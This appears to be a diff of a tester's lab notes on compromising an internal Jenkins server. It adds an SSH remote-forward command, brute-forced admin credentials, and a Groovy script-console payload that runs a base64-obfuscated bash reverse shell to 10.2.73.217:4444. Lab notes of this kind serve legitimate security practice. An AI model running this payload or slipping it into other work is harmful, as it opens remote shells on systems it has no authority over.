@@ -328,11 +328,6 @@ Ubuntu 18.04 - 'lxd' Privilege Escalation                                       
 ### MySQL
 ![[7b0360d0e401488aa3fabf129c98b5c2.png]]
 
-# Sockets
-![[9f5e68e14b24497596a25f2ec681c4ac.png]]
-![[e2fdcf79b3ea407f862cefbff985543b.png]]
-![[3b94b2df264a49a4b3b56fb484237212.png]]
-
 # Might be useful later.
 ![[7e89daf88d744232aa60a6f69b686b5d.png]]
 
@@ -402,6 +397,9 @@ arnold147
 
 ## Internal: Jenkins
 Found out Jenkins is running on 8080. I did some SSH remote forwarding and am able to access Jenkins.
+```bash
+ssh -N -R 10.2.73.217:8080:127.0.0.1:8080 nate@10.2.73.217
+```
 ![[Pasted image 20220205104928.png]]
 
 
@@ -417,3 +415,25 @@ After reviewing the privesc materials again, I'm confident the exploit will eith
 ![[Pasted image 20220205100754.png]]
 ![[Pasted image 20220205100826.png]]
 
+I decided to brute force Jenkins.
+
+The header size changed here, at the password `spongebob`
+
+It worked!
+
+> Jenkins Login
+> User
+> ```
+> Admin
+> ```
+> Pass
+> ```
+> spongebob
+> ```
+
+
+Using this script
+
+```bash
+def sout = new StringBuffer(), serr = new StringBuffer()                                                          def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjczLjIxNy80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()                                                                                                proc.consumeProcessOutput(sout, serr)                                                                             proc.waitForOrKill(1000)                                                                                          println "out> $sout err> $serr"
+```
